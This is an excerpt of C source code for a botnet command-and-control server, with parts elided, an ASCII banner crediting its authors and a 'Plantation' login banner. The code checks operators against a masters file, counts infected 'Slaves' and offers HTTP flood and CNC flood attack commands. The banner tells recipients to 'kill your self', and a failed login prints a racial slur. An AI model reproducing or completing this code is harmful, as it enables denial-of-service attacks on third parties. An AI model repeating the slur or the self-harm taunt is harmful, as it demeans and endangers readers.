//                                                                                              
//                                                                                              
//                                         BBBBBBBBBBBBBBBBB   MMMMMMMM               MMMMMMMMWWWWWWWW                           WWWWWWWW
//                                         B::::::::::::::::B  M:::::::M             M:::::::MW::::::W                           W::::::W
//                                         B::::::BBBBBB:::::B M::::::::M           M::::::::MW::::::W                           W::::::W
//                                         BB:::::B     B:::::BM:::::::::M         M:::::::::MW::::::W                           W::::::W
//                                           B::::B     B:::::BM::::::::::M       M::::::::::M W:::::W           WWWWW           W:::::W 
//                                           B::::B     B:::::BM:::::::::::M     M:::::::::::M  W:::::W         W:::::W         W:::::W  
//                                           B::::BBBBBB:::::B M:::::::M::::M   M::::M:::::::M   W:::::W       W:::::::W       W:::::W   
//                                           B:::::::::::::BB  M::::::M M::::M M::::M M::::::M    W:::::W     W:::::::::W     W:::::W    
//                                           B::::BBBBBB:::::B M::::::M  M::::M::::M  M::::::M     W:::::W   W:::::W:::::W   W:::::W     
//                                           B::::B     B:::::BM::::::M   M:::::::M   M::::::M      W:::::W W:::::W W:::::W W:::::W      
//                                           B::::B     B:::::BM::::::M    M:::::M    M::::::M       W:::::W:::::W   W:::::W:::::W       
//                                           B::::B     B:::::BM::::::M     MMMMM     M::::::M        W:::::::::W     W:::::::::W        
//                                         BB:::::BBBBBB::::::BM::::::M               M::::::M         W:::::::W       W:::::::W         
//                                         B:::::::::::::::::B M::::::M               M::::::M          W:::::W         W:::::W          
//                                         B::::::::::::::::B  M::::::M               M::::::M           W:::W           W:::W           
//                                         BBBBBBBBBBBBBBBBB   MMMMMMMM               MMMMMMMM            WWW             WWW            
//
//
//                                                                              If you were given this
//                                                                                  kill your self 
//                                                                           twitter: @publicdatabases
//                                                                        xmpp: volatile@digitalgangster.com
//                                                                                   Version: 1.3
//                                                                           THIS IS A LOGIN.TXT SERVER.C
//                                                                               DO NOT MODIFY BELOW
//                                                                              Current status: private
//                                                                         Working on client.c as of 11/12/16
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
...
int Find_Login(char *str) {
    ...
    if((fp = fopen("masters.txt", "r")) == NULL){
        return(-1);
    }
...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(failed_line1, "\x1b[36mGET OUT NIGGER! NOT A MASTER!\r\n");
		...
		char welcome_line [100];
		char banner_bot_count [2048];
		memset(banner_bot_count, 0, 2048);
		
		sprintf(ascii_banner_line1, "\x1b[31m  ____   _                _          _    _  \r\n");
		sprintf(ascii_banner_line2, "\x1b[31m |  _ \ | |  __ _  _ __  | |_  __ _ | |_ (_)  ___   _ __ \r\n");
		sprintf(ascii_banner_line3, "\x1b[31m | |_) || | / _` || '_ \ | __|/ _` || __|| | / _ \ | '_ \ \r\n");
		sprintf(ascii_banner_line4, "\x1b[31m |  __/ | || (_| || | | || |_| (_| || |_ | || (_) || | | | \r\n");
		sprintf(ascii_banner_line5, "\x1b[31m |_|    |_| \__,_||_| |_| \__|\__,_| \__||_| \___/ |_| |_|  \r\n");
		sprintf(ascii_banner_line6, "\r\n");	
		sprintf(welcome_line,       "\x1b[31m       #\x1b[36m----- \x1b[37mSlaves: %d\x1b[36m -----\x1b[31m#\r\n", BotsConnected(), OperatorsConnected); 
		...
		if(send(datafd, "\x1b[37m~~~~> ", 12, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "STATUS")){
				...
				sprintf(statuscount, "[+] - Slaves: [\x1b[36m %d \x1b[37m] [+] - Status: [\x1b[36m %d \x1b[37m]\r\n", TELFound, scannerreport);
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(helpline4,  "   \x1b[37m- HTTP-GET - \x1b[36m!* HTTPFLOOD GET Url Port / TIME 100000\r\n");
				sprintf(helpline5,  "   \x1b[37m- CNC - \x1b[36m!* CNC IP PORT TIME\r\n");
				sprintf(helpline7,  "   \x1b[37m- Kills Attack - \x1b[36mKILL\r\n");
				sprintf(helpline9,  "   \x1b[37m- Slave Count - \x1b[36mBOTS\r\n");
				...
				sprintf(ls4,  "   \x1b[37m- HTTP - \x1b[36m!* HTTPFLOOD GET Url 80 / Time 100000\r\n");
			...
			if(strstr(buf, "LOGOUT")) {
                ...
                trim(buf);
                if(send(datafd, "\x1b[37m~~~~> ", 11, MSG_NOSIGNAL) == -1) goto end;
